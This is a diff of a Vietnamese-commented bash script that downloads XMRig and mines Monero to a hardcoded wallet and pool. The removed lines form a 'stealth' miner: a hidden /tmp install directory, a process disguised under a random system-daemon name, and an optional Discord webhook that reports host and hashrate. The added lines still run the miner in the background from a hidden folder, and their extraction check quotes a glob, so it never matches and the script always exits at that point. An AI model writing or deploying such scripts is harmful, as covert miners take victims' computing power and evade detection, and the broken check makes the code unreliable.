@@ -1,44 +1,49 @@
 #!/bin/bash
 
-# ========== CẤU HÌNH ==========
-WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
+# ========= Cấu hình =========
 POOL="pool.hashvault.pro:443"
-WORKER="silent_$(cat /etc/hostname 2>/dev/null || echo VM)"
-DISCORD_WEBHOOK=""  # Để trống nếu không muốn gửi
-# ==============================
-
-CPU_THREADS=$(nproc --all)
-CUSTOM_NAME=$(shuf -n1 -e "dbusd" "syscore" "logworker" "udevd" "corelogd")
-INSTALL_DIR="/tmp/.xmrig_hidden"
+WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
+WORKER="tesst-$(hostname)"
+CPU_THREADS=$(nproc --all)  # Tự động chọn số luồng CPU
 LOG_FILE="/tmp/.xmrig_hidden.log"
+INSTALL_DIR="$HOME/.xmrig"  # Thư mục ẩn
 
-echo "🚀 Đang cài XMRig stealth (Lite)..."
+# ========= Bắt đầu =========
+echo "🚀 Bắt đầu tải và cài đặt XMRig..."
 
-# Bước 1: Tạo thư mục ẩn
-mkdir -p "$INSTALL_DIR"
-cd "$INSTALL_DIR"
+# Tải lại tệp XMRig
+wget -q --show-progress https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.1-linux-x64.tar.gz -O xmrig.tar.gz
 
-# Bước 2: Tải binary đã biên dịch
-wget -q https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.1-linux-x64.tar.gz -O xmrig.tar.gz
-tar -xzf xmrig.tar.gz
-mv xmrig-*-linux-x64/xmrig "$CUSTOM_NAME"
-chmod +x "$CUSTOM_NAME"
-rm -rf xmrig.tar.gz xmrig-*-linux-x64
-
-# Bước 3: Chạy ngầm
-echo "🛠️ Đang khởi động tiến trình khai thác..."
-nohup ./$CUSTOM_NAME -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \
-  --threads=$CPU_THREADS --donate-level=0 --max-cpu-usage=70 > "$LOG_FILE" 2>&1 &
-
-# Bước 4 (tuỳ chọn): Gửi log về Discord
-if [ ! -z "$DISCORD_WEBHOOK" ]; then
-  sleep 15  # đợi có log
-  HASHRATE=$(grep -i "speed" "$LOG_FILE" | tail -n1 | grep -oE "[0-9]+\.[0-9]+ h/s")
-  curl -s -H "Content-Type: application/json" -X POST -d "{
-    \"username\": \"XMRig Stealth\",
-    \"content\": \"⛏️ Đang đào Monero\\n💻 Worker: \`$WORKER\`\\n📈 Hashrate: \`$HASHRATE\`\\n🧠 Threads: \`$CPU_THREADS\`\"
-  }" "$DISCORD_WEBHOOK" >/dev/null 2>&1
+# Kiểm tra xem tệp đã tải về thành công không
+if [ ! -f "xmrig.tar.gz" ]; then
+  echo "❌ Lỗi tải tệp XMRig. Thử lại."
+  exit 1
 fi
 
-echo "✅ Đào đã chạy ngầm với tên tiến trình: $CUSTOM_NAME"
-echo "📂 File log: $LOG_FILE"
+# Giải nén tệp XMRig
+tar -xvzf xmrig.tar.gz
+
+# Kiểm tra xem tệp đã giải nén thành công chưa
+if [ ! -d "xmrig-*-linux-x64" ]; then
+  echo "❌ Lỗi giải nén tệp. Thử lại."
+  exit 1
+fi
+
+# Di chuyển vào thư mục XMRig và sao chép tệp vào thư mục ẩn
+cd xmrig-*-linux-x64
+mkdir -p "$INSTALL_DIR"
+cp ./xmrig "$INSTALL_DIR/xmrig"
+
+# Thiết lập quyền truy cập
+chmod +x "$INSTALL_DIR/xmrig"
+
+# Chạy XMRig ẩn danh và lưu log
+echo "🛠️ Đang khởi động quá trình đào Monero..."
+nohup "$INSTALL_DIR/xmrig" -o $POOL -u $WALLET.$WORKER -k --coin monero --tls --cpu-priority=3 --threads=$CPU_THREADS --max-cpu-usage=70 > "$LOG_FILE" 2>&1 &
+
+# Thông báo đã khởi động thành công
+echo "✅ Đang đào Monero, tiến trình đang chạy ngầm."
+echo "📂 Log: $LOG_FILE"
+
+# Kiểm tra log để đảm bảo tiến trình đào đang chạy
+tail -f "$LOG_FILE"
